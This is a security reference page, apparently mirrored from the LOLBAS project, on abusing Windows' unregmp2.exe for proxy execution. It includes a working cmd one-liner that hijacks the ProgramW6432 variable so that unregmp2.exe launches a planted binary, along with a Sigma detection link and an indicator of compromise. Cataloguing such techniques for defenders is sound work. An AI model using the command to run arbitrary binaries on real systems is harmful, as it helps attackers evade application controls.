---
title: "Unregmp2.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Unregmp2.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Unregmp2.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Unregmp2.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1202"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Unregmp2.exe

Microsoft Windows Media Player Setup Utility

## Metadata

- Category: OSBinaries
- Created: 2021-12-06
- Author: Wade Hickey
- Source Path: yml/OSBinaries/Unregmp2.yml

## Paths

- `C:\Windows\System32\unregmp2.exe`
- `C:\Windows\SysWOW64\unregmp2.exe`

## Commands

### 1. Execute

Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.

```cmd
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
```

- Use Case: Proxy execution of binary
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
- IOC: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP`

## Resources

- {'Link': 'https://twitter.com/notwhickey/status/1466588365336293385'}

## Acknowledgements

- {'Person': 'Wade Hickey', 'Handle': '@notwhickey'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Unregmp2.yml)
